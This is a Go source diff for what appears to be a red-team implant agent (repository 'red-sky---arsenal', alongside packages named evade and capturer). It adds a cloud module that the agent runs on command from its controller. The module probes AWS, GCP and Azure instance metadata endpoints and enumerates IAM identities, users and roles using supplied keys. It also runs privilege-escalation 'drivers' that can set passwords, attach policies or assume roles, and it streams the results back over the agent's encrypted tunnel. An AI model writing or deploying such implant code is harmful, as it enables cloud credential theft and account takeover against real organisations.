@@ -26,6 +26,7 @@ import (
 
 	"github.com/sk666G/red-sky---arsenal/internal/agentfw"
 	"github.com/sk666G/red-sky---arsenal/internal/capturer"
+	"github.com/sk666G/red-sky---arsenal/internal/cloudgo"
 	"github.com/sk666G/red-sky---arsenal/internal/crypto"
 	"github.com/sk666G/red-sky---arsenal/internal/cryptor"
 	"github.com/sk666G/red-sky---arsenal/internal/evade"
@@ -243,6 +244,13 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runIcs(conn, sess, is)
+		case proto.TypeCloudStart:
+			var cc proto.CloudStart
+			if err := json.Unmarshal(env.Payload, &cc); err != nil {
+				log.Printf("[cloud] unmarshal: %v", err)
+				continue
+			}
+			go runCloud(conn, sess, cc)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
@@ -942,4 +950,144 @@ func runIcsDNP3(ctx context.Context, ic proto.IcsStart, send func(string, string
 	}
 	det := fmt.Sprintf("fn=0x%02x iin=0x%04x raw=%x", resp.Function, resp.IIN.Raw, resp.Raw)
 	send("read", "ok", det, true, false)
+}
+
+// runCloud drives a cloud-provider operation on the agent. Dispatches by
+// Action to the appropriate cloudgo primitive, streams CloudData.
+func runCloud(conn net.Conn, sess *crypto.Session, c proto.CloudStart) {
+	send := func(stage, msg, detail string, ok, done bool) {
+		sendTunnelAck(conn, sess, proto.TypeCloudData, proto.CloudData{
+			SessionID: c.SessionID,
+			Stage:     stage,
+			Message:   msg,
+			Detail:    detail,
+			OK:        ok,
+			Done:      done,
+		})
+	}
+
+	switch c.Action {
+	case "probe":
+		opts := cloudgo.IMDSOptions{}
+		var results []cloudgo.ProbeResult
+		switch c.Cloud {
+		case "aws":
+			results = cloudgo.ProbeAWS(opts)
+		case "gcp":
+			results = cloudgo.ProbeGCP(opts)
+		case "azure":
+			results = cloudgo.ProbeAzure(opts)
+		default:
+			send("error", "cloud must be aws|gcp|azure", "", false, true)
+			return
+		}
+		for _, r := range results {
+			ok := r.OK
+			det := r.Body
+			if len(det) > 800 {
+				det = det[:800]
+			}
+			if r.Error != "" {
+				det = r.Error
+			}
+			send("probe", r.URL, det, ok, false)
+		}
+
+	case "chain":
+		name, results := cloudgo.ProbeChain(cloudgo.IMDSOptions{})
+		if name == "" {
+			send("probe", "no cloud IMDS reachable", "", false, false)
+			return
+		}
+		send("probe", "live cloud: "+name, "", true, false)
+		for _, r := range results {
+			if r.OK {
+				det := r.Body
+				if len(det) > 800 {
+					det = det[:800]
+				}
+				send("probe", r.URL, det, true, false)
+			}
+		}
+
+	case "identity":
+		key := cloudgo.AWSKey{
+			AccessKeyID:     c.AccessKeyID,
+			SecretAccessKey: c.SecretAccessKey,
+			SessionToken:    c.SessionToken,
+			Region:          c.Region,
+		}
+		id, err := cloudgo.GetCallerIdentity(key)
+		if err != nil {
+			send("identity", "sts error", err.Error(), false, false)
+			return
+		}
+		send("identity", "identity", fmt.Sprintf("account=%s arn=%s userid=%s", id.Account, id.Arn, id.UserID), true, false)
+
+	case "users":
+		key := cloudgo.AWSKey{AccessKeyID: c.AccessKeyID, SecretAccessKey: c.SecretAccessKey, SessionToken: c.SessionToken, Region: c.Region}
+		users, err := cloudgo.ListUsers(key)
+		if err != nil {
+			send("iam", "list-users error", err.Error(), false, false)
+			return
+		}
+		for _, u := range users {
+			send("iam", "user", u.UserName+" "+u.Arn, true, false)
+		}
+
+	case "roles":
+		key := cloudgo.AWSKey{AccessKeyID: c.AccessKeyID, SecretAccessKey: c.SecretAccessKey, SessionToken: c.SessionToken, Region: c.Region}
+		roles, err := cloudgo.ListRoles(key)
+		if err != nil {
+			send("iam", "list-roles error", err.Error(), false, false)
+			return
+		}
+		for _, r := range roles {
+			send("iam", "role", r.RoleName+" "+r.Arn, true, false)
+		}
+
+	case "simulate":
+		key := cloudgo.AWSKey{AccessKeyID: c.AccessKeyID, SecretAccessKey: c.SecretAccessKey, SessionToken: c.SessionToken, Region: c.Region}
+		actions := c.Actions
+		if len(actions) == 0 {
+			actions = cloudgo.ProbeActions
+		}
+		res, err := cloudgo.SimulatePrincipalPolicy(key, c.PolicySourceArn, actions)
+		if err != nil {
+			send("simulate", "simulate error", err.Error(), false, false)
+			return
+		}
+		allowed := 0
+		for _, r := range res {
+			if r.Decision == "allowed" {
+				allowed++
+				send("simulate", "ALLOW", r.Action, true, false)
+			}
+		}
+		send("simulate", fmt.Sprintf("%d/%d allowed", allowed, len(res)), "", true, false)
+
+	case "driver":
+		key := cloudgo.AWSKey{AccessKeyID: c.AccessKeyID, SecretAccessKey: c.SecretAccessKey, SessionToken: c.SessionToken, Region: c.Region}
+		summary, err := cloudgo.ApplyDriver(key, c.Driver, cloudgo.DriverOptions{
+			TargetUser:   c.TargetUser,
+			TargetGroup:  c.TargetGroup,
+			PolicyARN:    c.PolicyARN,
+			VersionID:    c.VersionID,
+			RoleARN:      c.RoleARN,
+			SessionName:  c.SessionName,
+			Password:     c.Password,
+			PolicyName:   c.PolicyName,
+			DurationSecs: c.DurationSecs,
+		})
+		if err != nil {
+			send("driver", "driver error", err.Error(), false, false)
+			return
+		}
+		send("driver", "ok", summary, true, false)
+
+	default:
+		send("error", "unknown cloud action: "+c.Action, "", false, true)
+		return
+	}
+	send("done", "", "", true, true)
 }
